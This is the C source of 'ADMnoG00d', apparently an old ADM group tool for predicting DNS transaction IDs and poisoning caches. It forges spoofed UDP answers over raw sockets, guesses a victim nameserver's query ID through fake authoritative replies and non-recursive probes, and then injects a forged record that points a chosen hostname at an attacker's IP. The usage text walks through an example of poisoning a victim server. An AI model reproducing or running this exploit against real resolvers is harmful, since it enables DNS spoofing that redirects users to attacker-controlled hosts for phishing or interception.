/***************************/
/* ADMnog00d (c) ADM       */
/***************************/
/*  ADM DNS ID PREDICTOR   */
/***************************/

#include <fcntl.h>
#include <unistd.h>           
#include "dns.h"
#include "ADM-spoof.c"
#include "ADMDNS2.c"


#define  VERSION "0.7 pub"
#define  SPOOFIP "4.4.4.4"
#define  ERROR  -1
#define  LEN   sizeof(struct sockaddr)
#define  UNDASPOOF "111.111.111.111"
#define  TIMEOUT 300
#define  DNSHDRSIZE 12

void usage()
{

   printf(" ADMnoG00D <your ip> <dns trust> <domaine trust> <ip victim> <TYPE> <spoof name> <spoof ip> <ns.trust.for.the.spoof> [ID] \n"); 
   printf("\n ex: ADMnoG00d ppp.evil.com ns1.victim.com pr.example ns.victim.com 1 mouhhahahaha.hol.fr 31.3.3.7 ns.isdnet.net [ID] \n");
   printf(" well... we going to poison ns.victime.com for they resolv mouhhahaha.hol.fr in 31.3.3.7\n");
   printf(" we use pr.example and ns1.provnet for find ID of ns.victim.com\n");
   printf(" we use ns.isdnet.net for spoof because they have auth on *.hol.fr\n");
   printf(" for more information..\n");
   printf(" check ftp.janova.org/pub/ADM/ \n");
   printf(" mail  ADM@janova.org \n");
   printf(" ask Heike from me...:) \n"); 
   exit(-1); 
}  

void senddnspkt(s,d_ip,wwwname,ip,dns)
int s;
u_long d_ip;
char *wwwname;
char *ip;
struct dnshdr *dns;
{
 struct sockaddr_in sin;
 int  i;
 char buffer[1024];
 char *data = (char *)(buffer+DNSHDRSIZE);
 bzero(buffer,sizeof(buffer));
 memcpy(buffer,dns,DNSHDRSIZE);

if(dns->qr == 0)
  {
   i=makepaketQS(data,wwwname,TYPE_A);
   sin.sin_family = AF_INET;
   sin.sin_port   = htons(53);
   sin.sin_addr.s_addr = d_ip;
   sendto(s,buffer,DNSHDRSIZE+i,0,(struct sockaddr *)&sin,LEN);
  }
 
 else
  {
  i=makepaketAW(data,wwwname,ip,TYPE_A);
  sin.sin_family = AF_INET;
  sin.sin_port   = htons(53);
  sin.sin_addr.s_addr = d_ip;
  sendto(s,buffer,DNSHDRSIZE+i,0,(struct sockaddr *)&sin,LEN);
  }
}
                    
 
  

void dns_qs_no_rd(s,d_ip,wwwname,ID)
int s;
u_long d_ip;
char *wwwname;
int ID;
{
struct dnshdr *dns;
char   *data;
char   buffer[1024];
int i;

dns  = (struct dnshdr *)buffer;
data = (char *)(buffer+DNSHDRSIZE);
bzero(buffer,sizeof(buffer));

       dns->id      = htons(ID);
       dns->qr      = 0;
       dns->rd      = 0; /* dont want the recusion !! */
       dns->aa      = 0;
       dns->que_num = htons(1);
       dns->rep_num = htons(0);
       i=makepaketQS(data,wwwname,TYPE_A);
       senddnspkt(s,d_ip,wwwname,NULL,dns);
}
       
    
                                                                
                     
void main(int argc, char **argv)
     {
         struct   sockaddr_in sin_rcp;
	 struct   dnshdr *dns,  *dns_recv;
	 char            *data, *data2;
         char            buffer2[4000];
         char            buffer[4000];
         char            spoofname[255];
         char            spoofip[255];
         char            dnstrust[255];
         char            bla[255];
         char            *alacon;
         unsigned char   fakename[255];
         unsigned char   namez[255];     
	 unsigned long   s_ip,  s_ip2;
	 unsigned long   d_ip,  d_ip2, trust;
         unsigned int    DA_ID = 65535, loop = 65535;                      
	          int    sraw, s_r, i, on=1, x, ID,timez;
	          int    len = sizeof(struct sockaddr);
 
 dns_recv = (struct dnshdr *)(buffer);
 data2    = (char *)(buffer+DNSHDRSIZE);
 dns      = (struct dnshdr *)buffer2;
 data     = (char *)(buffer2+DNSHDRSIZE);
 
 bzero(buffer2,sizeof(buffer2));
 srand(time(NULL));
        

if( (s_r=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) == ERROR ){
     perror("socket");
     exit(ERROR);
     }  

 
  if( (fcntl(s_r,F_SETFL,O_NONBLOCK)) == ERROR ){
     perror("fcntl");
     exit(ERROR);
     }      
 
         
if ((sraw = socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) == ERROR ){
    perror("socket");
    exit(ERROR);
    }
    
if( (setsockopt(sraw, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) == ERROR)){
    perror("setsockopt");
    exit(ERROR);
    }
 
 if(argc < 2) usage();
 
 
 if(argc > 9 )DA_ID = loop = atoi(argv[9]);
  
if(argc > 6)strcpy(spoofname,argv[6]);
 else{
     printf("enter the name you wanna spoof:");
     scanf("%s",spoofname);
    }

if(argc > 7)strcpy(bla,argv[7]);
  else{
     printf("enter the ip's  of the spoof name:");
     scanf("%s",bla);
    }
  
  alacon =(char *)inet_ntoa(host2ip(bla));
  strcpy(spoofip,alacon);
    
    
  
  if( argc > 8 ) strcpy(bla,argv[8]);
  else{
      printf("enter the DNS trust of the victim:");
       scanf("%s",bla);
      }
  
  alacon =(char *)inet_ntoa(host2ip(bla));
  strcpy(dnstrust,alacon);
                       
             
 
 printf("ADMnoG00d %s\n",VERSION); 
 printf("\033[1mHeike\033[0m ownz Me So g\033[5m\033[36m0\033[0m\033[1m0\033[0md\n");
 sleep(1);
 printf("\nLets Play =)!!\n");  

/* save some param */ 
s_ip2        = host2ip(argv[1]);
d_ip2 = d_ip = host2ip(argv[4]);
trust =        host2ip(argv[2]);
s_ip         = host2ip(UNDASPOOF);


while(1){

      
       sprintf(fakename,"%i%i%i%i%i%i.%s",
               myrand(),
               myrand(),
               myrand(),
               myrand(),
               myrand(),
               myrand(),
               argv[3]);
       
     sendquestion(s_ip,d_ip,fakename,TYPE_A);
       
      
    /* end of question packet */
   

    bzero(buffer2,sizeof(buffer2)); /* RE init some variable */
    bzero(namez,sizeof(namez)); 
    i=0; 
    x=0;


/* here  start the spoof anwser */

ID = loop;

for(;loop >= ID-10 ;loop--){
       dns->id      = htons(loop);
       dns->qr      = 1;
       dns->rd      = 1;
       dns->aa      = 1;
       dns->que_num = htons(1);
       dns->rep_num = htons(1);
                                                 
       i=makepaketAW(data,fakename,SPOOFIP,TYPE_A);
       udp_send(sraw,trust,d_ip2,53,53,buffer2,DNSHDRSIZE+i);
    }
 
bzero(buffer2,sizeof(buffer2)); /* RE init some variable */
bzero(namez,sizeof(namez));
i=0;
x=0;
             
 /* time for test spoof     */

 dns_qs_no_rd(s_r,d_ip2,fakename,myrand()); /* here we sending question */
                                            /* non recursive ! */
     
 /* we waiting for awnser ... */
     
 while(1){    
  for(timez=0;timez < TIMEOUT; timez++){
     if( recvfrom(s_r,buffer,sizeof(buffer),0,(struct sockaddr *)&sin_rcp,&len) != -1 )
       {
        printf("ok whe have the reponse ;)\n");
        timez = 0;
        break;
       }
     usleep(10);
     timez++;
    }
   if(timez != 0){
     printf("hum no reponse from the NS ressend question..\n");
     dns_qs_no_rd(s_r,d_ip2,fakename,myrand());
     }
   else break;
 } 
   /* ok we have a awnser */
   printf("fakename = %s\n",fakename);
       if(sin_rcp.sin_addr.s_addr ==  d_ip2 )
          if(sin_rcp.sin_port == htons(53) )
            {
             if( dns_recv->qr == 1 )
                if( dns_recv->rep_num == 0 ) /* hum we dont have found the right ID */                                              
                       printf("try %i < ID < %i \n",ID-10,ID);
         
                    else{
                     /* Hoho we have  the spoof has worked we have found the right ID ! */
                     printf("the DNS ID of %s iz %i< ID <%i !!\n",argv[4],loop-10,loop);
                     printf("let's send the spoof...\n");
                     dnsspoof(dnstrust,argv[4],spoofname,spoofip,loop,atoi(argv[5]));          
                     printf("spoof sended ...\n");
                     exit(0);
                     }                  
              } /* end of if (sin_rcp.sin_port == htons(53) ) */
      bzero(buffer,sizeof(buffer));    
           
  } /* end of while loop */ 

}/* end of proggies */ 
